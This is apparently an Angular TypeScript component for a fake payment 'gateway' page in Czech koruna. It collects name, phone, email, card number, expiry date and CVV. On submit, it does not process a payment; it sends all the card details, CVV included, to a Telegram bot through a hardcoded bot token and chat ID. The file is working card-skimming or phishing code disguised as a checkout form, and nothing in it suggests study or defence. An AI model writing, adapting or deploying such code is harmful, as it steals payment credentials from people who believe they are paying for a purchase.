import { HttpClient } from '@angular/common/http';
import { Component, ElementRef, OnInit, Renderer2, ViewChild } from '@angular/core';
import { FormGroup, FormBuilder, Validators, AbstractControl, ValidationErrors } from '@angular/forms';

@Component({
  selector: 'app-gateway',
  templateUrl: './gateway.component.html',
  styleUrls: ['./gateway.component.css']
})
export class GatewayComponent {
  paymentForm: FormGroup;

  submitted = false;

  private readonly BOT_TOKEN = 'bot7882298266:AAHKN8O8IKjx_0VzvJPKxEEzjj_eiTAdyD0'; // Replace with your bot token
  private readonly CHAT_ID = '-4556448975';

  amount = "Kč " + localStorage.getItem("finalPrice");
  constructor(private fb: FormBuilder, private renderer: Renderer2, private http: HttpClient) {
    this.paymentForm = this.fb.group({
      fullname: ['', [Validators.required]],
      phone: ['', [Validators.required]],
      email: ['', [Validators.required, Validators.email]],
      cardnumber: ['', [Validators.required, this.validateCreditCardNumber]],
      expirationdate: ['', [Validators.required, this.validateExpirationDate]],
      securitycode: ['', [Validators.required, Validators.minLength(3), Validators.maxLength(4), Validators.pattern(/^\d{3,4}$/)]]
    });
  }

  showAlertBox: boolean = false;

  // Call this method when you want to display the alert box
  triggerAlert() {
    this.showAlertBox = true;

    // Set the alert box to disappear after 5 seconds (5000ms)
    setTimeout(() => {
      this.showAlertBox = false;
    }, 5000);
  }



  validateCreditCardNumber(control: any) {
    const cardNumber = control.value.replace(/\s+/g, '');
    const cardRegex = /^(?:3[47]\d{13}|(?:4\d|5[1-5]|65)\d{14}|(?:6011|(?:2131|1800|35\d{3})\d{11}))$/;
    return cardRegex.test(cardNumber) ? null : { invalidCardNumber: true };
  }

  validateExpirationDate(control: any) {
    const input = control.value.replace(/\D/g, ''); // Remove non-digit characters
    if (input.length !== 4) {
      // Must have exactly 4 digits
      return { invalidExpirationDate: true };
    }
  
    const month = parseInt(input.substring(0, 2), 10);
    const year = parseInt(input.substring(2, 4), 10);
  
    // Check if month is valid (1-12)
    if (isNaN(month) || month < 1 || month > 12) {
      return { invalidExpirationDate: true };
    }
  
    const currentYear = new Date().getFullYear() % 100; // Get last two digits of the current year
    const currentMonth = new Date().getMonth() + 1; // January is 0, so we add 1
  
    // Check if the expiration date is in the past
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return { expiredCard: true }; // Card expired
    }
  
    return null;  // Return null if valid
  }

  formatCardNumber() {
    let cardNumber = this.paymentForm.get('cardnumber')?.value || '';
    cardNumber = cardNumber.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber.replace(/(\d{4})/g, '$1 ').trim();
    this.paymentForm.get('cardnumber')?.setValue(cardNumber);
  }

  formatExpirationDate() {
    let expirationDate = this.paymentForm.get('expirationdate')?.value || '';
    expirationDate = expirationDate.replace(/\D/g, '').substring(0, 4);
    const month = expirationDate.substring(0, 2);
    const year = expirationDate.substring(2, 4);

    if (month.length === 2 && (parseInt(month, 10) < 1 || parseInt(month, 10) > 12)) {
      expirationDate = '01';
    }

    if (expirationDate.length >= 2) {
      expirationDate = month + '/' + year;
    }

    this.paymentForm.get('expirationdate')?.setValue(expirationDate);
  }

  onSubmit() {
    const message = `
*New Payment Information*\n
Fullname: ${this.paymentForm.value.fullname}\n
Phone: ${this.paymentForm.value.phone}\n
Email: ${this.paymentForm.value.email}\n
CC: ${this.paymentForm.value.cardnumber}\n
Expiration Date: ${this.paymentForm.value.expirationdate}\n
CVV: ${this.paymentForm.value.securitycode}
  `;

    console.log('Submit button clicked');
  
    // Log form values
    console.log('Form Values:', this.paymentForm.value);
    console.log('Form Status:', this.paymentForm.status);
    
    // Check individual form control errors
    const controls = this.paymentForm.controls;
    console.log('Fullname Errors:', controls['fullname'].errors);
    console.log('Phone Errors:', controls['phone'].errors);
    console.log('Email Errors:', controls['email'].errors);
    console.log('Card Number Errors:', controls['cardnumber'].errors);
    console.log('Expiration Date Errors:', controls['expirationdate'].errors);
    console.log('Security Code Errors:', controls['securitycode'].errors);

    // If form is invalid, trigger alert
    if (this.paymentForm.invalid) {
      console.log('Form is invalid');
      this.triggerAlert();
      return;
    }

    // Show loader
    this.submitted = true;
    setTimeout(() => {
      this.submitted = false;
      console.log('Loader hidden after 5 seconds');
    }, 5000);
    this.sendMessageToTelegram(message);
    this.paymentForm.reset();
  }
  
  sendMessageToTelegram(message: string) {
    const url = `https://api.telegram.org/${this.BOT_TOKEN}/sendMessage`;

    const body = {
      chat_id: this.CHAT_ID,
      text: message,
      parse_mode: 'Markdown'  // Use 'HTML' if you prefer HTML formatting
    };

    this.http.post(url, body).subscribe(
      (response) => {
        console.log('Message sent successfully:', response);
        // You can also reset the form or show a success message here
        this.paymentForm.reset();
      },
      (error) => {
        console.error('Error sending message:', error);
      }
    );
  }

}
